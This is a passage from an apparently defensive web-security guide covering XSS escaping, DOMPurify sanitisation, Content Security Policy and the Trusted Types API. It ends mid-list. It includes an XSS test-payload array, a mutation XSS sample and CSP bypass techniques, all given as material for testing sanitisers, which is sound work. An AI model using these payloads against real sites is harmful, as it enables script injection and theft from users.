### Framework-Specific Approaches

#### React

React escapes values by default:

```jsx
// Safe - content is escaped
<div>{userContent}</div>
```

**Dangerous pattern to avoid:**

```jsx
// Bypasses escaping - only use with sanitized content
<div dangerouslySetInnerHTML={{__html: userContent}} />
```

**Safe usage with DOMPurify:**

```jsx
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(userContent)
}} />
```

#### Vue

Vue also escapes by default:

```vue
<!-- Safe - escaped -->
<div>{{ userContent }}</div>

<!-- Dangerous - renders raw HTML -->
<div v-html="userContent"></div>
```

**Safe pattern:**

```vue
<div v-html="$sanitize(userContent)"></div>
```

With vue-dompurify-html plugin or custom sanitization method.

#### Angular

Angular escapes interpolated values:

```typescript
// Safe - escaped
<div>{{ userContent }}</div>

// Bypasses security - requires explicit trust
<div [innerHTML]="trustedContent"></div>
```

**Sanitization through DomSanitizer:**

```typescript
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

getTrustedHTML(html: string) {
  const clean = DOMPurify.sanitize(html);
  return this.sanitizer.bypassSecurityTrustHtml(clean);
}
```

### Markdown as Safer Alternative

When users need formatting capabilities, Markdown parsers with HTML sanitization provide better security defaults:

```javascript
import marked from 'marked';
import DOMPurify from 'dompurify';

const html = marked.parse(userMarkdown);
const clean = DOMPurify.sanitize(html);
element.innerHTML = clean;
```

**marked with built-in sanitization:**

```javascript
marked.setOptions({
  sanitize: true,
  sanitizer: (html) => DOMPurify.sanitize(html)
});
```

### Template Literals and Tagged Templates

Template literals can create injection vulnerabilities:

```javascript
// UNSAFE - user content interpreted as HTML
element.innerHTML = `<div class="${userClass}">${userContent}</div>`;
```

**Tagged template for safe escaping:**

```javascript
function html(strings, ...values) {
  return strings.reduce((result, string, i) => {
    const value = values[i - 1];
    const escaped = String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
    return result + escaped + string;
  });
}

element.innerHTML = html`<div class="${userClass}">${userContent}</div>`;
```

### Context-Specific Escaping

Different contexts require different escaping strategies:

#### HTML Content Context

```javascript
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
```

#### HTML Attribute Context

Requires additional escaping for spaces and control characters:

```javascript
function escapeHtmlAttr(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}
```

#### JavaScript String Context

Never insert untrusted data directly into JavaScript:

```javascript
// UNSAFE
const script = `<script>var name = "${userName}";</script>`;

// Better: Use data attributes and read with JavaScript
<div data-name="${escapeHtmlAttr(userName)}"></div>
<script>
  const name = element.dataset.name; // Safely retrieved
</script>
```

#### URL Context

```javascript
function escapeUrl(str) {
  return encodeURIComponent(str);
}

// Validate URL schemes
function isSafeUrl(url) {
  const allowed = /^(https?|mailto|tel):/i;
  return allowed.test(url);
}
```

### Common Injection Vectors

#### Event Handlers in Attributes

```html
<!-- Malicious input -->
<img src=x onerror="alert('XSS')">
<a href="#" onclick="alert('XSS')">click</a>
```

DOMPurify removes these by default.

#### JavaScript URLs

```html
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')"></iframe>
```

Sanitizers block `javascript:` protocol.

#### Data URLs with HTML

```html
<object data="data:text/html,<script>alert('XSS')</script>"></object>
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
```

CSP `object-src` and sanitizer configuration prevents this.

#### Style Attributes and CSS Injection

```html
<div style="background: url('javascript:alert(1)')"></div>
<style>@import 'javascript:alert(1)';</style>
```

DOMPurify removes dangerous CSS expressions.

#### SVG Scripts

```html
<svg><script>alert('XSS')</script></svg>
<svg><foreignObject><body onload="alert('XSS')"></body></foreignObject></svg>
```

Sanitizers must be configured to handle SVG-specific vectors.

### Server-Side vs Client-Side Sanitization

**Server-side advantages:**

- Single point of control
- Reduced attack surface (client JavaScript can be disabled)
- Consistent sanitization across all clients
- Better for SEO and initial page load

**Client-side advantages:**

- Dynamic content without server round-trip
- Real-time preview for user-generated content
- Works with static hosting

**Best practice:** Sanitize on both server and client for defense-in-depth.

### Testing HTML Sanitization

#### XSS Payloads for Testing

```javascript
const testPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<input onfocus=alert("XSS") autofocus>',
  '<select onfocus=alert("XSS") autofocus>',
  '<textarea onfocus=alert("XSS") autofocus>',
  '<body onload=alert("XSS")>',
  '<marquee onstart=alert("XSS")>',
  '<details open ontoggle=alert("XSS")>',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<base href="javascript:alert(\'XSS\');//">'
];
```

#### Automated Testing

```javascript
describe('HTML Sanitization', () => {
  testPayloads.forEach(payload => {
    it(`should neutralize: ${payload}`, () => {
      const clean = DOMPurify.sanitize(payload);
      expect(clean).not.toContain('<script');
      expect(clean).not.toContain('onerror=');
      expect(clean).not.toContain('javascript:');
    });
  });
});
```

### Performance Considerations

**Sanitization cost:**

- DOMPurify processes ~1-10MB/s depending on content complexity
- Caching sanitized content reduces overhead
- Consider sanitizing on server for frequently-displayed content

**Optimization strategies:**

```javascript
// Cache sanitized content
const sanitizeCache = new Map();

function cachedSanitize(html) {
  if (sanitizeCache.has(html)) {
    return sanitizeCache.get(html);
  }
  const clean = DOMPurify.sanitize(html);
  sanitizeCache.set(html, clean);
  return clean;
}

// Limit cache size to prevent memory issues
if (sanitizeCache.size > 1000) {
  const firstKey = sanitizeCache.keys().next().value;
  sanitizeCache.delete(firstKey);
}
```

### Allowlist vs Blocklist Approaches

**Allowlist (recommended):** Define permitted tags, attributes, and protocols explicitly.

```javascript
const cleanHtml = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOWED_URI_REGEXP: /^https?:/
});
```

**Blocklist (not recommended):** Attempting to block all dangerous patterns is error-prone due to:

- New attack vectors discovered regularly
- Browser parsing quirks
- Encoding variations (UTF-8, UTF-7, HTML entities)
- Mutation XSS (mXSS) where sanitized HTML becomes dangerous after re-parsing

[Inference] Allowlists are more secure because they fail closed—anything not explicitly permitted is removed.

### Mutation XSS (mXSS)

Some HTML can appear safe after initial sanitization but become dangerous when the browser re-parses it:

```javascript
// Input
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// After sanitization in HTML context
<noscript><p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"></p></noscript>

// After browser parses inside innerHTML
<img src=x onerror=alert(1)> (executes!)
```

DOMPurify includes mXSS protection, but older or custom sanitizers may be vulnerable. [Inference] This demonstrates why using well-maintained, security-focused libraries is important rather than implementing custom sanitization.

### Rich Text Editors

When implementing WYSIWYG editors:

```javascript
// TinyMCE with sanitization
tinymce.init({
  selector: '#editor',
  plugins: 'code',
  valid_elements: 'p,br,strong/b,em/i,a[href|title]',
  extended_valid_elements: '',
  invalid_elements: 'script,style',
  cleanup: true
});

// Sanitize output before storage/display
const editorContent = tinymce.activeEditor.getContent();
const sanitized = DOMPurify.sanitize(editorContent);
```

**Never trust editor output without sanitization:** Editors have vulnerabilities, and users can manipulate DOM/network requests to bypass client-side validation.

---

## Content Security Policy Awareness

### CSP Directive Categories

#### Fetch Directives

Fetch directives control the locations from which specific resource types may be loaded.

**default-src** serves as the fallback for all other fetch directives. When a specific fetch directive is not defined, the browser uses default-src's value. Setting `default-src 'self'` restricts all resources to the same origin unless overridden by more specific directives.

**script-src** controls JavaScript execution sources. This includes inline scripts, external script files, event handlers, and JavaScript URLs. The directive can use nonces (`'nonce-{random}'`), hashes (`'sha256-{hash}'`), or source expressions. The `'strict-dynamic'` keyword enables a trust propagation model where scripts loaded by trusted scripts inherit that trust, simplifying CSP in modern applications.

**style-src** governs CSS loading from stylesheets, inline styles, and style attributes. Similar to script-src, it supports nonces and hashes for inline styles. The `'unsafe-inline'` keyword permits all inline styles but significantly weakens security.

**img-src** restricts image sources including `<img>`, CSS background images, and favicon sources. Data URIs can be allowed with `data:` scheme.

**connect-src** controls URLs that can be loaded using script interfaces, including XMLHttpRequest, fetch(), WebSocket, EventSource, and Navigator.sendBeacon(). This is critical for preventing data exfiltration through JavaScript.

**font-src** defines valid sources for fonts loaded via @font-face. Some browsers may require `data:` scheme for inline font data.

**object-src** restricts sources for `<object>`, `<embed>`, and `<applet>` elements. Setting this to `'none'` is recommended as these elements pose security risks.

**media-src** controls `<audio>`, `<video>`, and `<track>` element sources.

**frame-src** specifies valid sources for nested browsing contexts loaded via `<frame>` and `<iframe>`. This deprecates the older frame-ancestors directive for frame loading.

**worker-src** governs Worker, SharedWorker, and ServiceWorker script sources.

**manifest-src** restricts application manifest file sources.

#### Document Directives

**base-uri** restricts URLs that can appear in the `<base>` element. Without this directive, any URI is allowed, potentially enabling base tag injection attacks that redirect relative URLs.

**sandbox** enables a sandbox for the resource similar to the `<iframe>` sandbox attribute. It applies restrictions including preventing form submission, script execution, and popup windows. Individual restrictions can be relaxed using keywords like `allow-scripts` or `allow-forms`.

#### Navigation Directives

**form-action** restricts URLs that can be used as form submission targets. This prevents forms from submitting to attacker-controlled endpoints, mitigating data exfiltration through form manipulation.

**frame-ancestors** specifies valid parents that may embed the page using `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>`. This directive addresses clickjacking by controlling where the page can be framed. Unlike X-Frame-Options, it supports multiple domains and more granular control.

**navigate-to** restricts URLs to which the document may navigate by any means. [Inference: This includes hyperlinks, form submissions, and window.location assignments, though specific browser implementations may vary.]

#### Reporting Directives

**report-uri** (deprecated) instructs the browser to send violation reports to the specified URI. The endpoint receives POST requests with JSON payloads containing violation details.

**report-to** replaces report-uri and uses the Reporting API. It references a reporting group defined in the Report-To header, enabling more flexible reporting configurations including multiple endpoints and retry logic.

### Source Expression Syntax

#### Host-Based Sources

Explicit host sources define allowed origins using scheme, hostname, and optional port patterns:

- `https://example.com` - specific origin with HTTPS
- `*.example.com` - wildcard subdomain matching
- `https://*.example.com:443` - with explicit port
- `example.com` - scheme-agnostic (matches http and https)

[Inference: Wildcard subdomains match any level of subdomains, so `*.example.com` would match both `sub.example.com` and `deep.sub.example.com`, though exact browser behavior should be verified per specification.]

#### Scheme Sources

- `https:` - allows any HTTPS origin
- `data:` - permits data URIs
- `blob:` - allows blob URLs
- `filesystem:` - permits filesystem URLs

#### Keyword Sources

Keyword sources must be wrapped in single quotes:

**'self'** matches the document's origin (protocol, domain, and port). It does not include subdomains.

**'unsafe-inline'** permits inline scripts, styles, event handlers, and style attributes. This keyword significantly weakens CSP and should be avoided. Nonces or hashes provide safer alternatives for necessary inline code.

**'unsafe-eval'** allows eval(), Function(), setTimeout() with string arguments, and setInterval() with string arguments. This creates XSS vulnerabilities and should be avoided when possible.

**'unsafe-hashes'** allows specific inline event handlers and style attributes to be enabled via hashes while keeping other inline content blocked. This provides more granular control than 'unsafe-inline'.

**'none'** blocks all sources for the directive. Useful for object-src, base-uri, and other directives where no loading is needed.

**'strict-dynamic'** enables trust propagation for scripts. Scripts loaded by trusted scripts (those matching nonces or hashes) are automatically trusted, even if they wouldn't match the source list. This simplifies CSP for applications using script loaders or module bundlers. [Inference: When 'strict-dynamic' is present, host-based allowlists and 'self' are typically ignored for backwards compatibility, though specification details govern exact behavior.]

**'report-sample'** includes the first 40 characters of the blocked inline script, style, or event handler in the violation report, aiding debugging.

#### Nonce-Based Sources

Nonces are cryptographically random tokens generated per page load:

```
'nonce-rAnd0m123'
```

The corresponding HTML includes the matching nonce:

```html
<script nonce="rAnd0m123">
  // trusted code
</script>
```

[Inference: Nonces must be unpredictable and unique per request to be secure. Reusing nonces or using predictable values defeats the protection.] The server must generate fresh nonces for each response and cannot cache pages with nonce-based CSP.

#### Hash-Based Sources

Hashes allow specific inline scripts or styles by matching their content hash:

```
'sha256-abc123...'
'sha384-def456...'
'sha512-ghi789...'
```

The hash is calculated from the exact content between the script or style tags, including whitespace. Changes to the content invalidate the hash. Hashes work well for static inline code but are impractical for dynamic content.

### CSP Deployment Modes

#### Enforcement Mode

Policies are enforced via the `Content-Security-Policy` HTTP header:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

Violations are blocked and optionally reported. This is the standard deployment mode for active protection.

#### Report-Only Mode

The `Content-Security-Policy-Report-Only` header enables monitoring without enforcement:

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

Violations are reported but not blocked. This mode is essential for testing policies before enforcement, identifying necessary exceptions, and monitoring for attacks without risking functionality breakage.

#### Meta Tag Delivery

CSP can be delivered via HTML meta tags:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

[Inference: Meta tag delivery has limitations compared to HTTP headers - specifically, report-uri, report-to, frame-ancestors, and sandbox directives cannot be used in meta tags per specification constraints.] HTTP headers remain the preferred delivery mechanism.

### Violation Reporting

#### Report Structure

Violation reports contain:

- **document-uri**: The page where violation occurred
- **violated-directive**: The specific directive that was violated
- **effective-directive**: The directive that actually enforced the violation (considering fallbacks)
- **original-policy**: The complete CSP that was violated
- **blocked-uri**: The URI that was blocked
- **status-code**: HTTP response status of the document
- **source-file**: File containing the violation (if available)
- **line-number** and **column-number**: Location in source (if available)
- **sample**: Code sample if 'report-sample' was specified

#### Reporting API Integration

The Reporting API provides structured reporting:

```
Report-To: {"group":"csp-endpoint","max_age":86400,"endpoints":[{"url":"https://reports.example.com/csp"}]}
Content-Security-Policy: default-src 'self'; report-to csp-endpoint
```

This enables batching, retry logic, and unified reporting across multiple browser features.

### Common CSP Patterns

#### Strict CSP with Nonces

```
Content-Security-Policy: 
  default-src 'none';
  script-src 'nonce-{random}' 'strict-dynamic';
  style-src 'nonce-{random}';
  img-src 'self' https:;
  font-src 'self';
  connect-src 'self';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
```

This pattern provides strong protection by requiring nonces for all inline code and using strict-dynamic for script loading.

#### Hash-Based Static Sites

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'sha256-{hash1}' 'sha256-{hash2}';
  style-src 'self' 'sha256-{hash3}';
  object-src 'none';
  base-uri 'self';
```

Suitable for static content where inline scripts and styles don't change frequently.

#### API/Service Policy

```
Content-Security-Policy:
  default-src 'none';
  frame-ancestors 'none';
```

For APIs that only serve data and should never load resources or be framed.

### CSP Evaluation Logic

#### Directive Fallback Chain

When evaluating resource loads, browsers follow a fallback hierarchy. For example, if script-src is not defined, the browser checks default-src. If neither is defined, all sources are allowed. [Inference: The specific fallback behavior varies by resource type, with most fetch directives falling back to default-src, but directives like frame-ancestors do not have fallback behavior.]

#### Source Matching Order

[Inference: When multiple sources are specified, browsers check them in the order they appear in the policy, though the exact matching algorithm may vary by implementation.] The presence of 'none' alongside other sources effectively creates a policy that blocks everything since 'none' explicitly forbids all sources.

#### Interaction with Mixed Content

CSP interacts with mixed content blocking. [Inference: A policy that allows HTTP sources may still have those loads blocked by the browser's mixed content blocker when served over HTTPS, creating a defense-in-depth effect, though specific behavior depends on browser implementations.]

### CSP Level Progression

#### CSP Level 1

The original specification included basic fetch directives, report-uri, and sandbox. This established the foundation for resource loading controls.

#### CSP Level 2

Added nonces, hashes, 'strict-dynamic', 'unsafe-inline' with nonce/hash fallback behavior, frame-ancestors, child-src, form-action, upgrade-insecure-requests, and block-all-mixed-content.

#### CSP Level 3

Introduced 'unsafe-hashes', report-to, worker-src, manifest-src, navigate-to, and prefetch-src. [Unverified: Browser adoption varies significantly for Level 3 features, with some directives having limited support.]

### Bypass Considerations

#### JSONP Endpoints

JSONP endpoints on allowed domains can execute arbitrary JavaScript if attackers control the callback parameter. Including domains with JSONP endpoints in script-src creates bypass opportunities.

#### Angular Template Injection

Older Angular versions with CSP-unsafe template patterns can be exploited if Angular is from an allowed source. [Inference: This typically involves injecting Angular expressions into templates that get evaluated, though specific exploitation techniques depend on Angular version and configuration.]

#### Allowed CDN Compromise

If a CDN listed in script-src is compromised or contains user-uploaded content, attackers may execute arbitrary scripts. This risk applies to any third-party script source in the policy.

#### Dangling Markup Injection

[Inference: In some configurations, incomplete tags or markup injection may bypass CSP by causing the browser to reinterpret document structure, though modern browsers have implemented protections against this attack vector.]

#### Base Tag Injection

Without base-uri restrictions, attackers may inject `<base>` tags to redirect relative URLs to attacker-controlled domains, bypassing CSP's source restrictions for resources loaded via relative paths.

### CSP Testing Approaches

#### Browser Developer Tools

Modern browsers report CSP violations in the console with details about blocked resources and the violated directive. The network panel shows blocked requests with CSP indicators.

#### Automated Policy Analysis

Tools can parse CSP headers and identify:

- Missing critical directives
- Unsafe keywords like 'unsafe-inline' or 'unsafe-eval'
- Overly permissive sources like wildcard domains
- Known bypass patterns
- [Unverified: Various commercial and open-source tools claim to perform this analysis, though their accuracy and coverage varies]

#### Gradual Rollout Strategy

1. Deploy in report-only mode across all pages
2. Collect and analyze violation reports
3. Adjust policy to accommodate legitimate usage
4. Enable enforcement for subset of users
5. Monitor for breakage
6. Gradually expand enforcement
7. Continuously refine based on reports

This approach minimizes disruption while building confidence in the policy.

### Performance Implications

#### Nonce Generation Overhead

[Inference: Generating cryptographically random nonces per request adds computational overhead, though modern systems typically handle this efficiently. The impact becomes more significant at very high request rates.]

#### Cache Implications

Nonce-based CSP prevents caching of HTML pages since each response requires unique nonces. This increases server load and latency compared to cached responses. [Inference: Edge computing and CDN nonce generation can mitigate this, though implementation complexity increases.]

#### Report Volume

High-traffic sites may generate substantial violation report volumes, especially during initial deployment or policy changes. [Inference: This can impact endpoint capacity and monitoring systems, requiring rate limiting or sampling strategies for large-scale deployments.]

### Integration with Other Security Headers

#### Interaction with X-Frame-Options

When both frame-ancestors (CSP) and X-Frame-Options are present, browsers that support CSP Level 2+ ignore X-Frame-Options and use frame-ancestors. For backward compatibility, both headers should be sent with matching policies.

#### Relationship with X-Content-Type-Options

X-Content-Type-Options: nosniff prevents MIME type confusion that could bypass CSP. For example, it prevents a JPEG with embedded JavaScript from being executed if misinterpreted as script.

#### Complementing X-XSS-Protection

[Inference: While X-XSS-Protection is deprecated in modern browsers, it historically provided additional XSS protection. CSP is now the preferred mechanism, offering more comprehensive and configurable protection.]

### CSP for Single Page Applications

#### Dynamic Script Loading Challenges

SPAs using dynamic imports, code splitting, or module loaders face complexity with strict CSP. The 'strict-dynamic' keyword specifically addresses this by allowing trusted scripts to load additional scripts.

#### Framework-Specific Considerations

React, Vue, and Angular each have patterns for CSP compliance:

- React generally works well with nonces or hashes for server-rendered content
- Vue requires configuration for CSP mode to avoid unsafe-eval
- Angular deprecated unsafe-eval patterns in later versions [Unverified: Specific framework versions may have different CSP requirements and compatibility characteristics.]

#### Service Worker Integration

worker-src controls Service Worker loading. [Inference: Service Workers have privileged access to the page and network, making strict worker-src policies critical for security, though specific threat models depend on the application architecture.]

---

## Trusted Types API

### Core Architecture

The Trusted Types API enforces type safety for DOM XSS sinks by requiring specific object types rather than raw strings. The browser rejects string assignments to dangerous sinks unless explicitly configured otherwise, creating a compile-time-like safety model at runtime.

The API defines four trusted type objects: `TrustedHTML`, `TrustedScript`, `TrustedScriptURL`, and `TrustedURL`. Each type wraps a string value and can only be created through policies that implement sanitization or validation logic. DOM sinks check the type of incoming values and only accept matching trusted types or throw `TypeError` exceptions.

### Policy Creation and Management

Policies are created through `trustedTypes.createPolicy(name, rules)` where rules is an object containing sanitizer functions. Each policy must have a unique name within the document context. The rules object can define `createHTML`, `createScript`, `createScriptURL`, and `createURL` methods that receive string input and return sanitized strings.

```javascript
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (input) => {
    // Sanitization logic
    return DOMPurify.sanitize(input);
  },
  createScriptURL: (input) => {
    if (input.startsWith('https://trusted-cdn.example.com/')) {
      return input;
    }
    throw new TypeError('Untrusted script source');
  }
});
```

The policy object exposes methods corresponding to defined rules: `policy.createHTML(string)`, `policy.createScript(string)`, etc. These methods return the appropriate trusted type object.

### Default Policy Behavior

A single default policy can be created using the special name `'default'`. This policy intercepts string assignments to sinks when no explicit trusted type is provided, acting as a fallback sanitizer. The default policy enables incremental adoption by allowing legacy string-based code to function while still applying sanitization.

[Inference] The default policy likely executes for every string-to-sink assignment that lacks an explicit trusted type, creating potential performance overhead in string-heavy applications.

The default policy cannot be deleted once created. Attempting to create multiple default policies throws an exception. Applications must carefully design default policy rules since they apply globally across all untyped sink assignments.

### Content Security Policy Integration

Trusted Types enforcement requires CSP directives. The `require-trusted-types-for 'script'` directive activates enforcement, causing browsers to reject string assignments to XSS sinks. Without this directive, the API remains available but non-enforcing.

The `trusted-types` directive specifies allowed policy names: `trusted-types myPolicy otherPolicy`. This creates a whitelist of policies that can be instantiated. The wildcard `trusted-types *` permits any policy name. Including `'allow-duplicates'` permits multiple policies with the same name, though this weakens security guarantees.

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types myPolicy default
```

The `'none'` keyword (`trusted-types 'none'`) prevents all policy creation except the default policy, useful for locked-down environments where only centralized sanitization should exist.

### Protected DOM Sinks

The API protects specific DOM operations that create executable code or navigate contexts:

**HTML injection sinks:**

- `Element.innerHTML`
- `Element.outerHTML`
- `Document.write()`
- `Document.writeln()`
- `Element.insertAdjacentHTML()`
- `DOMParser.parseFromString()` (when parsing HTML)

**Script execution sinks:**

- `HTMLScriptElement.src`
- `HTMLScriptElement.text`
- `HTMLScriptElement.textContent`
- `HTMLScriptElement.innerText`
- Dynamic `import()`
- `eval()`
- `Function()` constructor
- `setTimeout()` and `setInterval()` with string arguments

**Navigation sinks:**

- `HTMLIFrameElement.src`
- `HTMLEmbedElement.src`
- `HTMLObjectElement.data`
- `HTMLObjectElement.codeBase`

**URL-based sinks:**

- `HTMLAnchorElement.href` (certain contexts)
- `HTMLAreaElement.href` (certain contexts)

[Unverified] The exact list of protected sinks may vary by browser implementation and version. Specification updates may add or reclassify sinks.

### Type Construction and Validation

Trusted type objects are immutable once created. They expose a `toString()` method that returns the underlying string value, but this value cannot be modified. Attempting to create trusted types without using policies (e.g., through object literal construction) fails.

```javascript
const html = policy.createHTML('<div>Safe content</div>');
element.innerHTML = html; // Works
element.innerHTML = html.toString(); // Throws TypeError in enforcement mode
```

The `trustedTypes.isHTML()`, `trustedTypes.isScript()`, `trustedTypes.isScriptURL()`, and `trustedTypes.isURL()` methods check whether a value is the corresponding trusted type. These enable conditional logic based on type safety.

Trusted types created by one policy are accepted by sinks regardless of which policy created them. The type system provides protection through creation control, not through policy-specific validation at consumption time.

### Policy Design Patterns

**Allowlist-based policies** validate input against known-safe patterns:

```javascript
const strictPolicy = trustedTypes.createPolicy('strict', {
  createScriptURL: (url) => {
    const allowed = ['https://cdn.example.com/', 'https://trusted.example.org/'];
    if (allowed.some(prefix => url.startsWith(prefix))) {
      return url;
    }
    throw new TypeError(`URL ${url} not in allowlist`);
  }
});
```

**Sanitization policies** transform potentially dangerous input:

```javascript
const sanitizingPolicy = trustedTypes.createPolicy('sanitizer', {
  createHTML: (dirty) => {
    const sanitizer = new Sanitizer({
      allowElements: ['div', 'span', 'p', 'b', 'i'],
      allowAttributes: {'class': ['*']}
    });
    return sanitizer.sanitize(dirty);
  }
});
```

[Inference] Policies that throw exceptions on invalid input likely provide better security than policies that silently modify or ignore unsafe content, as they prevent unexpected data flow.

**Pass-through policies** exist for trusted sources where validation already occurred:

```javascript
const trustedSourcePolicy = trustedTypes.createPolicy('trusted-source', {
  createHTML: (html) => html,
  createScript: (script) => script
});
```

Pass-through policies should only be used when input provenance is absolutely verified, as they provide no protection.

### Migration Strategies

**Report-only mode** allows detection of violations without enforcement. The CSP directive `Content-Security-Policy-Report-Only: require-trusted-types-for 'script'` logs violations to the console and sends reports to configured endpoints without blocking operations.

**Incremental policy adoption** involves:

1. Deploy report-only CSP with `trusted-types *` to identify all string-to-sink assignments
2. Create default policy that logs and passes through all strings
3. Analyze logs to identify high-risk code paths
4. Replace high-risk assignments with explicit policy usage
5. Tighten default policy to reject or sanitize specific patterns
6. Switch to enforcement mode
7. Remove default policy and restrict `trusted-types` directive

**Library wrapping** encapsulates third-party code:

```javascript
const libraryPolicy = trustedTypes.createPolicy('library-wrapper', {
  createHTML: (input) => {
    // Apply library-specific sanitization
    return thirdPartyLibrary.sanitize(input);
  }
});

// Wrap library calls
function safeLibraryRender(content) {
  const safe = libraryPolicy.createHTML(content);
  return library.render(safe);
}
```

### Performance Characteristics

[Inference] Policy invocation adds overhead to every sink assignment, with the magnitude depending on sanitization complexity. Simple allowlist checks likely incur minimal cost, while full HTML parsing and sanitization may significantly impact performance.

Trusted type object creation allocates memory for wrapper objects. Applications creating millions of trusted type instances may experience memory pressure compared to raw string usage.

[Speculation] Browser implementations might optimize trusted type checks through inline caching or type specialization in JIT compilation, but this depends on implementation details not specified in the standard.

The default policy executes on every untyped sink assignment, creating a potential performance bottleneck in string-heavy code paths. Explicit policy usage bypasses default policy overhead.

### Security Boundaries

Trusted Types protect against DOM XSS by controlling string-to-code conversions, but do not prevent:

- XSS through unprotected sinks (e.g., custom data attributes interpreted as JavaScript)
- Logic vulnerabilities in policy implementation
- Exploitation of allowed HTML elements (e.g., `<form action>`, `<meta http-equiv>`)
- Server-side XSS in initially served HTML
- Prototype pollution that modifies policy behavior
- Attacks that bypass sink protection through alternative code paths

[Unverified disclaimer] The effectiveness of Trusted Types depends on comprehensive policy implementation and correct identification of all dangerous sinks. Complete XSS prevention cannot be guaranteed as new bypass techniques may emerge.

Policies execute with full JavaScript privileges. A compromised policy (through prototype pollution, monkey-patching, or implementation bugs) undermines all protection. Policy code should be minimized, audited, and isolated from untrusted input processing where possible.

### Browser API Surface

The `trustedTypes` global object provides:

- `createPolicy(name, rules)`: Creates a new policy
- `isHTML(value)`: Returns true if value is TrustedHTML
- `isScript(value)`: Returns true if TrustedScript
- `isScriptURL(value)`: Returns true if TrustedScriptURL
- `isURL(value)`: Returns true if TrustedURL
- `emptyHTML`: Pre-created TrustedHTML representing empty string
- `emptyScript`: Pre-created TrustedScript representing empty string
- `getAttributeType(tagName, attribute, elementNs, attrNs)`: Returns expected type for attribute assignment
- `getPropertyType(tagName, property, elementNs)`: Returns expected type for property assignment

The `getAttributeType()` and `getPropertyType()` methods enable dynamic determination of required types, useful for framework authors building abstraction layers.

### Framework Integration Patterns

Frameworks can integrate Trusted Types by:

**Template compilation**: Transform templates into code that generates trusted types:

```javascript
// Template: <div>{{userContent}}</div>
// Compiled output:
const rendered = policy.createHTML(`<div>${escapeHTML(userContent)}</div>`);
```

**Type-aware rendering**: Accept both strings and trusted types, wrapping strings automatically:

```javascript
function render(content) {
  if (typeof content === 'string') {
    content = policy.createHTML(content);
  }
  if (!trustedTypes.isHTML(content)) {
    throw new TypeError('Expected HTML content');
  }
  element.innerHTML = content;
}
```

**Context-aware policies**: Create different policies for different security contexts:

```javascript
const strictPolicy = trustedTypes.createPolicy('strict', { /* restrictive rules */ });
const lenientPolicy = trustedTypes.createPolicy('lenient', { /* permissive rules */ });

// Use strict policy for user input, lenient for trusted templates
```

### Testing and Validation

CSP reporting provides violation detection:

```javascript
document.addEventListener('securitypolicyviolation', (e) => {
  if (e.violatedDirective.includes('require-trusted-types-for')) {
    console.log('Trusted Types violation:', {
      blockedURI: e.blockedURI,
      violatedDirective: e.violatedDirective,
      sample: e.sample
    });
  }
});
```

Unit tests should verify policy behavior:

```javascript
describe('HTML policy', () => {
  it('rejects script tags', () => {
    expect(() => {
      policy.createHTML('<script>alert(1)</script>');
    }).toThrow();
  });
  
  it('allows safe markup', () => {
    const html = policy.createHTML('<div>safe</div>');
    expect(trustedTypes.isHTML(html)).toBe(true);
  });
});
```

[Inference] Integration tests in browsers with Trusted Types enforcement enabled likely provide the most reliable validation, as they test actual browser behavior rather than mocked policy logic.

### Edge Cases and Limitations

**Same-document navigation**: `location.href = string` may or may not require TrustedURL depending on browser implementation and URL context.

**Worker contexts**: Trusted Types enforcement in Workers depends on the Worker's own CSP, not the parent document's CSP.

**Dynamic policy modification**: Policy methods cannot be modified after creation. Attempting to reassign `policy.createHTML` fails silently or throws in strict mode.

**JSON.stringify on trusted types**: Serializing trusted types produces objects with `toString()` methods, not the underlying strings. Deserialization requires explicit handling.

**Cross-realm trusted types**: [Unverified] Trusted types created in one realm (e.g., iframe) may not be recognized in another realm depending on browser implementation.

### Adoption Considerations

[Inference] Organizations with large legacy codebases likely face significant migration costs due to widespread string-based DOM manipulation. Automated refactoring tools would substantially reduce adoption barriers but may not exist for all frameworks.

Third-party script compatibility represents a major adoption challenge. Analytics, advertising, and widget scripts frequently use string-based DOM APIs and may break under enforcement without vendor updates.

[Speculation] Widespread Trusted Types adoption might incentivize development of standardized sanitization libraries and framework-level support, reducing per-application implementation burden.

The requirement for CSP deployment limits adoption in environments where CSP conflicts with existing architectures (e.g., applications relying on inline event handlers, inline scripts without nonces, or eval-based template engines).

---

## Sanitizing User Input

### DOM-Based Attack Vectors

DOM-based vulnerabilities occur entirely client-side when JavaScript processes user-controlled data unsafely. Unlike reflected or stored XSS where the server sends malicious content, DOM-based attacks manipulate the page through client-side code execution without server involvement.

#### Sources and Sinks

**Sources** are JavaScript properties containing user-controllable data:

- `location.href`, `location.search`, `location.hash`
- `document.referrer`
- `document.cookie`
- `localStorage`, `sessionStorage`
- `postMessage` event data
- `window.name`
- URL parameters via `URLSearchParams`

**Sinks** are dangerous JavaScript methods that execute or render data:

